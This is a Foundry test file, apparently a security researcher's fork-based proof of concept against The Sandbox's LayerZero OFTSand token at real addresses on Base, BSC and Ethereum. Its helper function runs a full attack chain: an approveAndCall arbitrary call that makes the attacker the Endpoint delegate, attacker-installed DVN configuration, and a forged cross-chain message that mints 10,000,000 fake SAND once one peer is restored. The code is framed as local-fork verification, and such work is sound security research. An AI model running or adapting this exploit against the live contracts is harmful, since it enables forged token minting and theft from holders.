// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

/// C2-01 OFTSand (The Sandbox LayerZero OFT) — fork-verification of live extractability.
/// Read-only mainnet; every state change happens on a local fork only.
///
/// Target: 0xac531Eb26Ca1d21b85126De8FB87E80E09002DcF (same address on Ethereum, BSC, Base)
///   - Ethereum = OFTAdapterForSand (locks real SAND, no approveAndCall)
///   - BSC/Base = OFTSand (the token itself; carries the approveAndCall arbitrary-call bug)
///
/// Verified claims:
///   A. The approveAndCall arbitrary "call-as-token" primitive is LIVE today (Base + BSC):
///      attacker sets Endpoint.delegates(OFTSand) = attacker with one tx.
///   B. With delegate rights the attacker can install itself as the receive-side DVN and get a
///      forged OFT mint message verified + committed (Endpoint.verify stores the payload).
///   C. Delivery is hard-blocked by OAppReceiver: peers[srcEid] == 0 -> NoPeer(30101).
///      No SAND is minted, no value moves. This is the sole live blocker.
///   D. If the owner (3-of-5 Safe) restores ONE peer, the exact same prepared message mints
///      10,000,000 fake SAND to the attacker (latent re-arm proof).
///   E. The Ethereum adapter has no approveAndCall; send() is disabled; peers are zero.
///   F. Privilege boundaries: first-param guard blocks foreign addresses; self-calls cannot
///      take ownership / admin / super-operator / setPeer.

struct Origin {
    uint32 srcEid;
    bytes32 sender;
    uint64 nonce;
}

struct SetConfigParam {
    uint32 eid;
    uint32 configType;
    bytes config;
}

struct UlnConfig {
    uint64 confirmations;
    uint8 requiredDVNCount;
    uint8 optionalDVNCount;
    uint8 optionalDVNThreshold;
    address[] requiredDVNs;
    address[] optionalDVNs;
}

struct SendParam {
    uint32 dstEid;
    bytes32 to;
    uint256 amountLD;
    uint256 minAmountLD;
    bytes extraOptions;
    bytes composeMsg;
    bytes oftCmd;
}

struct MessagingFee {
    uint256 nativeFee;
    uint256 lzTokenFee;
}

struct MessagingReceipt {
    bytes32 guid;
    uint64 nonce;
    MessagingFee fee;
}

struct OFTReceipt {
    uint256 amountSentLD;
    uint256 amountReceivedLD;
}

interface IOFTSand {
    function approveAndCall(address target, uint256 amount, bytes calldata data)
        external
        payable
        returns (bytes memory);

    function send(SendParam calldata p, MessagingFee calldata f, address refund)
        external
        payable
        returns (MessagingReceipt memory, OFTReceipt memory);

    function getEnabled() external view returns (bool);
    function enable(bool enabled) external;
    function owner() external view returns (address);
    function getAdmin() external view returns (address);
    function peers(uint32 eid) external view returns (bytes32);
    function setPeer(uint32 eid, bytes32 peer) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function transferOwnership(address newOwner) external;
    function setSuperOperator(address who, bool enabled) external;
}

interface IEndpoint {
    function setDelegate(address delegate) external;
    function delegates(address oapp) external view returns (address);
    function setConfig(address oapp, address lib, SetConfigParam[] calldata params) external;
    function verify(Origin calldata origin, address receiver, bytes32 payloadHash) external;
    function lzReceive(
        Origin calldata origin,
        address receiver,
        bytes32 guid,
        bytes calldata message,
        bytes calldata extraData
    ) external payable;
    function lazyInboundNonce(address receiver, uint32 srcEid, bytes32 sender)
        external
        view
        returns (uint64);
    function eid() external view returns (uint32);
}

interface IReceiveUln302 {
    function verify(bytes calldata packetHeader, bytes32 payloadHash, uint64 confirmations) external;
    function commitVerification(bytes calldata packetHeader, bytes32 payloadHash) external;
}

contract OFTSandTest is Test {
    // Same address on all three chains
    address constant OFT = 0xac531Eb26Ca1d21b85126De8FB87E80E09002DcF;
    address constant EP = 0x1a44076050125825900e736c501f859c50fE728c;

    // Base
    uint32 constant BASE_EID = 30184;
    address constant BASE_RECEIVE_LIB = 0xc70AB6f32772f59fBfc23889Caf4Ba3376C84bAf;
    address constant BASE_OWNER = 0x18987794f808eE72Ae9127058F1C7d079736Ca45;
    address constant BASE_SAND_HOLDER = 0x35e4535B8fB48eb815429104D74b3792d0E730DB;

    // BSC
    uint32 constant BSC_EID = 30102;
    address constant BSC_RECEIVE_LIB = 0xB217266c3A98C8B2709Ee26836C98cf12f6cCEC1;
    address constant BSC_OWNER = 0x47032F58129341B90c83E312eE22d2e74D584B4A;

    uint32 constant ETH_EID = 30101;

    address attacker;

    // Base forged packet (prepared in setUp, pending in the endpoint's inbound channel)
    Origin s_origin;
    bytes32 s_guid;
    bytes s_message;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://base-rpc.publicnode.com")));
        (s_origin, s_guid, s_message) = _armAndForge(OFT, EP, BASE_RECEIVE_LIB, BASE_EID, ETH_EID);
    }

    /// @dev Executes the full attacker preparation on the currently selected fork:
    /// 1) approveAndCall -> Endpoint.setDelegate(attacker)   (the bug)
    /// 2) setConfig: attacker becomes the required receive DVN for srcEid
    /// 3) forge packet, ReceiveUln302.verify + commitVerification (payload queued in Endpoint)
    /// Returns the queued packet so tests can attempt delivery.
    function _armAndForge(
        address oft,
        address ep,
        address lib,
        uint32 dstEid,
        uint32 srcEid
    ) internal returns (Origin memory origin, bytes32 guid, bytes memory message) {
        // ---- 1) arbitrary call-as-token: set ourselves as delegate ----
        bytes memory inner = abi.encodeWithSelector(IEndpoint.setDelegate.selector, attacker);
        bytes memory data = bytes.concat(inner, bytes32(0)); // 36 -> 68 bytes (first-param length gate)
        vm.prank(attacker);
        IOFTSand(oft).approveAndCall(ep, 0, data);
        require(IEndpoint(ep).delegates(oft) == attacker, "delegate not set");

        // ---- 2) as delegate, install attacker as the required DVN ----
        address[] memory dvns = new address[](1);
        dvns[0] = attacker;
        // confirmations = NIL -> literal 0 confirmations; optional = NIL -> none
        UlnConfig memory cfg = UlnConfig(
            type(uint64).max,
            1,
            type(uint8).max,
            0,
            dvns,
            new address[](0)
        );
        SetConfigParam[] memory params = new SetConfigParam[](1);
        params[0] = SetConfigParam(srcEid, 2, abi.encode(cfg));
        vm.prank(attacker);
        IEndpoint(ep).setConfig(oft, lib, params);

        // ---- 3) forge a pending OFT mint message from the historical peer ----
        bytes32 oldPeer = bytes32(uint256(uint160(oft))); // historical peer == same address
        uint64 lazy = IEndpoint(ep).lazyInboundNonce(oft, srcEid, oldPeer);
        require(lazy > 0, "no historical path");
        uint64 nonce = lazy + 1;
        origin = Origin(srcEid, oldPeer, nonce);
        message = abi.encodePacked(
            bytes32(uint256(uint160(attacker))),
            uint64(10_000_000 * 1e6) // 10,000,000 SAND in shared decimals (6)
        );
        bytes32 recv32 = bytes32(uint256(uint160(oft)));
        guid = keccak256(abi.encodePacked(nonce, srcEid, oldPeer, dstEid, recv32));
        bytes memory header = abi.encodePacked(uint8(1), nonce, srcEid, oldPeer, dstEid, recv32);
        bytes32 payloadHash = keccak256(abi.encodePacked(guid, message));

        vm.prank(attacker);
        IReceiveUln302(lib).verify(header, payloadHash, 0);
        vm.prank(attacker);
        IReceiveUln302(lib).commitVerification(header, payloadHash);
    }

    // ---------------------------------------------------------------- Base ----

    /// A. the primitive is live
    function test_base_primitive_live_delegate_set() public view {
        assertEq(IEndpoint(EP).delegates(OFT), attacker, "delegate should be attacker");
    }

    /// C. delivery blocked by NoPeer; nothing minted
    function test_base_delivery_blocked_by_NoPeer() public {
        uint256 supplyBefore = IOFTSand(OFT).totalSupply();
        vm.expectRevert(abi.encodeWithSignature("NoPeer(uint32)", uint32(ETH_EID)));
        IEndpoint(EP).lzReceive(s_origin, OFT, s_guid, s_message, "");
        assertEq(IOFTSand(OFT).totalSupply(), supplyBefore, "supply must not change");
        assertEq(IOFTSand(OFT).balanceOf(attacker), 0, "attacker must hold 0");
        assertEq(OFT.balance, 0, "OFT holds no native");
        assertEq(IOFTSand(OFT).balanceOf(OFT), 0, "OFT holds no SAND");
    }

    /// D. one setPeer by the owner re-arms the full mint
    function test_base_rearm_one_peer_restores_mint() public {
        vm.prank(BASE_OWNER);
        IOFTSand(OFT).setPeer(ETH_EID, bytes32(uint256(uint160(OFT))));
        IEndpoint(EP).lzReceive(s_origin, OFT, s_guid, s_message, "");
        assertEq(IOFTSand(OFT).balanceOf(attacker), 10_000_000e18, "10M SAND minted");
    }

    /// E2. send() is disabled today
    function test_base_send_disabled() public {
        assertFalse(IOFTSand(OFT).getEnabled(), "enabled must be false");
        SendParam memory sp;
        sp.dstEid = ETH_EID;
        sp.to = bytes32(uint256(uint160(attacker)));
        sp.amountLD = 1e18;
        sp.minAmountLD = 1e18;
        MessagingFee memory fee;
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSignature("SendFunctionDisabled()"));
        IOFTSand(OFT).send(sp, fee, attacker);
    }

    /// E3. even with send re-enabled, a holder's send still reverts NoPeer
    function test_base_send_no_peer_even_if_enabled() public {
        vm.prank(BASE_OWNER);
        IOFTSand(OFT).enable(true);
        assertTrue(IOFTSand(OFT).getEnabled());
        SendParam memory sp;
        sp.dstEid = ETH_EID;
        sp.to = bytes32(uint256(uint160(attacker)));
        sp.amountLD = 1e18;
        sp.minAmountLD = 1e18;
        MessagingFee memory fee;
        vm.prank(BASE_SAND_HOLDER);
        vm.expectRevert(abi.encodeWithSignature("NoPeer(uint32)", uint32(ETH_EID)));
        IOFTSand(OFT).send(sp, fee, attacker);
    }

    /// F1. first-param guard blocks foreign addresses
    function test_base_first_param_guard() public {
        bytes memory data = bytes.concat(
            abi.encodeWithSelector(IEndpoint.setDelegate.selector, address(0xBEEF)),
            bytes32(0)
        );
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSignature("FirstParamNotSender()"));
        IOFTSand(OFT).approveAndCall(EP, 0, data);
    }

    /// F2. self-call cannot steal ownership (owner != OFT)
    function test_base_selfcall_cannot_transfer_ownership() public {
        bytes memory data = bytes.concat(
            abi.encodeWithSelector(IOFTSand.transferOwnership.selector, attacker),
            bytes32(0)
        );
        vm.prank(attacker);
        vm.expectRevert();
        IOFTSand(OFT).approveAndCall(OFT, 0, data);
        assertEq(IOFTSand(OFT).owner(), BASE_OWNER, "owner unchanged");
    }

    /// F3. self-call cannot become super-operator (admin != OFT)
    function test_base_selfcall_cannot_set_super_operator() public {
        bytes memory data = abi.encodeWithSelector(
            IOFTSand.setSuperOperator.selector,
            attacker,
            true
        );
        vm.prank(attacker);
        vm.expectRevert();
        IOFTSand(OFT).approveAndCall(OFT, 0, data);
        assertEq(IOFTSand(OFT).getAdmin(), BASE_OWNER, "admin unchanged");
    }

    /// F4. vanity address whose uint160 == EID still cannot setPeer (onlyOwner)
    function test_base_vanity_eid_cannot_set_peer() public {
        address vanity = address(uint160(ETH_EID));
        bytes memory data = abi.encodeWithSelector(
            IOFTSand.setPeer.selector,
            ETH_EID,
            bytes32(uint256(uint160(OFT)))
        );
        vm.prank(vanity);
        vm.expectRevert();
        IOFTSand(OFT).approveAndCall(OFT, 0, data);
        assertEq(IOFTSand(OFT).peers(ETH_EID), bytes32(0), "peer stays zero");
    }

    // ----------------------------------------------------------------- BSC ----

    function test_bsc_blocked_then_rearm() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", string("https://bsc-rpc.publicnode.com")));
        (Origin memory origin, bytes32 guid, bytes memory message) = _armAndForge(
            OFT,
            EP,
            BSC_RECEIVE_LIB,
            BSC_EID,
            ETH_EID
        );
        // blocked at latest block
        vm.expectRevert(abi.encodeWithSignature("NoPeer(uint32)", uint32(ETH_EID)));
        IEndpoint(EP).lzReceive(origin, OFT, guid, message, "");
        assertEq(IOFTSand(OFT).balanceOf(attacker), 0);
        // owner re-arms one peer -> same prepared message mints
        vm.prank(BSC_OWNER);
        IOFTSand(OFT).setPeer(ETH_EID, bytes32(uint256(uint160(OFT))));
        IEndpoint(EP).lzReceive(origin, OFT, guid, message, "");
        assertEq(IOFTSand(OFT).balanceOf(attacker), 10_000_000e18, "10M SAND minted on BSC");
    }

    // ------------------------------------------------------------ Ethereum ----

    /// E. Ethereum adapter: no approveAndCall, send disabled, peers zero, ~0 SAND left
    function test_eth_adapter_closed() public {
        vm.createSelectFork(
            vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")))
        );
        address adapter = OFT;
        (bool ok, ) = adapter.call(
            abi.encodeWithSelector(IOFTSand.approveAndCall.selector, EP, uint256(0), bytes(""))
        );
        assertFalse(ok, "adapter must not expose approveAndCall");
        assertFalse(IOFTSand(adapter).getEnabled(), "adapter send disabled");
        assertEq(IOFTSand(adapter).peers(BASE_EID), bytes32(0), "Base peer zero");
        assertEq(IOFTSand(adapter).peers(BSC_EID), bytes32(0), "BSC peer zero");
        assertEq(adapter.balance, 0, "adapter holds no native");

        SendParam memory sp;
        sp.dstEid = BASE_EID;
        sp.to = bytes32(uint256(uint160(attacker)));
        sp.amountLD = 1e18;
        sp.minAmountLD = 1e18;
        MessagingFee memory fee;
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSignature("SendFunctionDisabled()"));
        IOFTSand(adapter).send(sp, fee, attacker);
    }
}
